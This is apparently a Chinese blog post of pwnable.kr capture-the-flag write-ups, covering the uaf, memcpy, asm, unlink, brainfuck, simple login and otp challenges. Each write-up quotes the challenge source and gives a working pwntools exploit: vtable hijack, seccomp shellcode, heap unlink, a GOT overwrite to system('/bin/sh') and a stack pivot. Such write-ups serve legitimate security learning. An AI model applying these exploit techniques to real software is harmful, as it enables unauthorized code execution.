---
title: pwnable.kr_刷刷刷
abbrlink: 1345
date: 2018-09-21 15:24:39
tags:
---

## Uaf

**虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。**

**vptr每个对象都会有一个，而vptable是每个类有一个vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr，做多重继承的时候，继承了多个父类，就会有多个vptr**

**虚函数表的结构：它是一个函数指针表，每一个表项都指向一个函数。任何一个包含至少一个虚函数的类都会有这样一张表。需要注意的是vtable只包含虚函数的指针，没有函数体。实现上是一个函数指针的数组。虚函数表既有继承性又有多态性。每个派生类的vtable继承了它各个基类的vtable，如果基类vtable中包含某一项，则其派生类的vtable中也将包含同样的一项，但是两项的值可能不同。如果派生类覆写(override)了该项对应的虚函数，则派生类vtable的该项指向覆写后的虚函数，没有覆写的话，则沿用基类的值。
每一个类只有唯一的一个vtable，不是每个对象都有一个vtable，恰恰是每个同一个类的对象都有一个指针，这个指针指向该类的vtable（当然，前提是这个类包含虚函数）.那么，每个对象只额外增加了一个指针的大小，一般说来是4字节。
在类对象的内存布局中，首先是该类的vtable指针，然后才是对象数据。                                                                           在通过对象指针调用一个虚函数时，编译器生成的代码将先获取对象类的vtable指针，然后调用vtable中对应的项。对于通过对象指针调用的情况，在编译期间无法确定指针指向的是基类对象还是派生类对象，或者是哪个派生类的对象。但是在运行期间执行到调用语句时，这一点已经确定，编译后的调用代码能够根据具体对象获取正确的vtable，调用正确的虚函数，从而实现多态性。**

全文地址请点击：https://blog.csdn.net/qq_20307987/article/details/51511230?utm_source=copy 

根据源代码，可知:

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

思路: 执行步骤，3-2-2-1，第二次调用2的时候，将`introduce`的地址覆盖为`give_shell`的地址。

操作:

```
python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/uaf
./uaf 8 /tmp/uaf
```

## memcpy

```
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
        asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
	int i;
	for (i=0; i<len; i++) {
		dest[i] = src[i];
	}
	return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}

int main(void){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Hey, I have a boring assignment for CS class.. :(\n");
	printf("The assignment is simple.\n");

	printf("-----------------------------------------------------\n");
	printf("- What is the best implementation of memcpy?        -\n");
	printf("- 1. implement your own slow/fast version of memcpy -\n");
	printf("- 2. compare them with various size of data         -\n");
	printf("- 3. conclude your experiment and submit report     -\n");
	printf("-----------------------------------------------------\n");

	printf("This time, just help me out with my experiment and get flag\n");
	printf("No fancy hacking, I promise :D\n");

	unsigned long long t1, t2;
	int e;
	char* src;
	char* dest;
	unsigned int low, high;
	unsigned int size;
	// allocate memory
	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size_t sizes[10];
	int i=0;

	// setup experiment parameters
	for(e=4; e<14; e++){	// 2^13 = 8K
		low = pow(2,e-1);
		high = pow(2,e);
		printf("specify the memcpy amount between %d ~ %d : ", low, high);
		scanf("%d", &size);
		if( size < low || size > high ){
			printf("don't mess with the experiment.\n");
			exit(0);
		}
		sizes[i++] = size;
	}

	sleep(1);
	printf("ok, lets run the experiment with your configuration\n");
	sleep(1);

	// run experiment
	for(i=0; i<10; i++){
		size = sizes[i];
		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
		dest = malloc( size );

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		fast_memcpy(dest, src, size);		// block-to-block memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
		printf("\n");
	}

	printf("thanks for helping my experiment!\n");
	printf("flag : ----- erased in this source code -----\n");
	return 0;
}
```

要点:

- `fast_memcpy`函数中用于内存复制的两个指令`movdqa`和`movntps`他们的操作数如果是内存地址的话，那么这个地址必须是16字节对齐的，否则会产生一般保护性异常导致程序退出。
- `malloc`在分配内存时它实际上还会多分配4字节用于存储堆块信息，所以如果分配a字节实际上分配的是`a+4`字节。另外32位系统上该函数分配的内存是以8字节对齐的。

解题思路:

每次分配的内存地址能够被16整除就可以了（实际上由于`malloc`函数分配的内存8字节对齐，只要内存大小除以16的余数大于9就可以了）。

```
#-*- coding:utf8
from pwn import *

io = remote("pwnable.kr", 9022)
context.log_level = "debug"
for i in range(10):
    io.recvuntil(":")
    data = (2 ** (i + 4) / 16 - 1) * 16 + 9
    io.sendline(str(data))

io.interactive()
```

## asm

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

首先查看stub的内容:

```shell
qianfa@qianfa:~/Desktop/pwnable/asm$ disasm 4831c04831db4831c94831d24831f64831ff4831ed4d31c04d31c94d31d24d31db4d31e44d31ed4d31f64d31ff
   0:    48                       dec    eax
   1:    31 c0                    xor    eax, eax
   3:    48                       dec    eax
   4:    31 db                    xor    ebx, ebx
   6:    48                       dec    eax
   7:    31 c9                    xor    ecx, ecx
   9:    48                       dec    eax
   a:    31 d2                    xor    edx, edx
   c:    48                       dec    eax
   d:    31 f6                    xor    esi, esi
   f:    48                       dec    eax
  10:    31 ff                    xor    edi, edi
  12:    48                       dec    eax
  13:    31 ed                    xor    ebp, ebp
  15:    4d                       dec    ebp
  16:    31 c0                    xor    eax, eax
  18:    4d                       dec    ebp
  19:    31 c9                    xor    ecx, ecx
  1b:    4d                       dec    ebp
  1c:    31 d2                    xor    edx, edx
  1e:    4d                       dec    ebp
  1f:    31 db                    xor    ebx, ebx
  21:    4d                       dec    ebp
  22:    31 e4                    xor    esp, esp
  24:    4d                       dec    ebp
  25:    31 ed                    xor    ebp, ebp
  27:    4d                       dec    ebp
  28:    31 f6                    xor    esi, esi
  2a:    4d                       dec    ebp
  2b:    31 ff                    xor    edi, edi
```

大体上就是将部分寄存器的值清0。

直接操作:

```
#-*- coding:utf8
from pwn import *

# context.log_level = 'debug'
context(arch='amd64', os='linux')

p = ssh(host="pwnable.kr", port=2222, user="asm", password="guest")
io = p.connect_remote("0", 9026)

shellcode = ''
shellcode += shellcraft.open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.read("rax", "rsp", 100)          // 
shellcode += shellcraft.write(1, 'rsp', 100)
io.recvuntil("code:")
io.send(asm(shellcode))
print io.interactive()
```

## unlink

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

gets(A->buf) 很明显存在堆溢出，所以可以任意地址写，覆盖返回main函数地址为shell地址。

```
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
```

从汇编我们可以看到，只需要如下几个步骤即可:

```
esp = heap_A_address + 8
=>
ecx - 4 = heap_A_address + 8
=>
ecx = heap_A_address + 12
=>
[ebp - 4] = heap_A_address + 12
=>
[stack_A_address + 16] = heap_A_address + 12
```

同时，我们知道:

```
A: stack_A_address = &A = ebp - 0x14
B: stack_B_address = &B = ebp - 0xc
C: stack_C_address = &C = ebp - 0x10
```

任意地址写代码如下:

```
FD->bk = BK;
BK->fd = FD;
```

相应的有两种方法:

方法一:

FD->bk = BK,则payload 如下:

```
fd: stack_A_address + 12
bk: heap_A_address + 12
```

方法二:

BK->fd = FD,则payload如下:

```
fd: heap_A_address + 12
bk: stack_A_address + 16
```

所以payload如下:

```
from pwn import *

p = process("./unlink")
p.recvuntil(": ")
stack_A_address = int(p.recvn(10), 16)
print "stack_address: ", hex(stack_A_address)
p.recvuntil(": ")
heap_A_address = int(p.recvn(10), 16)
print "heap_address: ", hex(heap_A_address)
p.recvuntil("shell!")

elf = ELF("./unlink")
print "shell_address: " , hex(elf.symbols['shell'])

# method 1
#payload = p32(elf.symbols['shell']) + 'A' * 12 + p32(heap_A_address + 12) + p32(stack_A_address + 16)

# method 2
payload = p32(elf.symbols['shell']) + 'A' * 12 + p32(stack_A_address + 12) + p32(heap_A_address + 12)

p.sendline(payload)
p.interactive()
```

## brainfuck

```
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1;
  switch ( a1 )
  {
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(char *)p);
      break;
    case '<':
      result = p-- - 1;
      break;
    case '>':
      result = p++ + 1;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

该函数存在任意地址写，范围不超过1024左右个字节，而p指针不远处就是got表，所以可以通过修改putchar的地址为"main"函数地址，修改"memset"地址为"gets"函数地址，修改"fgets"地址为"system"地址。

需要注意的是，首先需要leak出libc的地址。

```
from pwn import *

debug = 0

#libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("./bf_libc.so")
context.log_level = "debug"

if debug:
    p = process("./bf")
else:
    p = remote("pwnable.kr", 9001)

main_address = 0x8048671
tape_address = 0x804A0A0
putchar_got_address = 0x804A030
p.recvuntil("[ ]\n")

# the first "." is used to run the putchar function,and then the putchar_got_address will have the true putchar_address
# get the libc_address
payload = "." + "<" * (tape_address - putchar_got_address) + ".>.>.>."

#modify putchar
payload += "<<<,>,>,>,"
# modify memset
payload += "<<<<<<<,>,>,>,"
# modify fgets
payload += "<" * 31 + ",>,>,>,."
p.sendline(payload)
print payload
putchar_address = u32(p.recvn(5)[1:])
print "put_address: ", hex(putchar_address)
libc_base = putchar_address - libc.symbols['putchar']
print "libc_base: ",hex(libc_base)

gets_address = libc_base + libc.symbols['gets']
print "gets_address: ", hex(gets_address)
system_address = libc_base + libc.symbols['system']
print "system_address: ", hex(system_address)
#attach(p)
p.send(p32(main_address) + p32(gets_address))
#attach(p)
p.send(p32(system_address))
p.recvuntil("[ ]")
#attach(p)
p.send("/bin/sh\x00")
p.interactive()
```

## simple login

```
_BOOL4 __cdecl auth(int decode_length)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]

  memcpy(&v4, &input, decode_length);           // 栈溢出,最多溢出4个字节,覆盖ebp
  s2 = (char *)calc_md5(&v2, 12);
  printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```

auth函数存在栈溢出，最多溢出4个字节，只能覆盖ebp，input在bss中。

leave    => mov esb ebp; pop ebp;

ret         => pop rip; jump rip;

通过修改ebp指向bss段，这样esp将指向bss段，从而可以控制rip。

```
from pwn import *
import base64

debug = int(raw_input("is_debug:"))

if debug:
    p = process("./login")
else:
    p = remote("pwnable.kr", 9003)

p.recvuntil(":")
payload = "a" * 4 + p32(0x08049284) + p32(0x0811EB40)
payload = base64.b64encode(payload)
p.sendline(payload)

p.interactive()
```

## otp

通过ulimit限制了进程可以创建文件的最大值，只要限制为0，那么最后的密码一定为空，于是空密码通过，在写脚本时还需要注意的点就是把错误输出重定向到标准输出中。

```
ulimit -f 0
```

```
import subprocess
subprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT)	
```

flag: *Darn... I always forget to check the return value of fclose() :(*











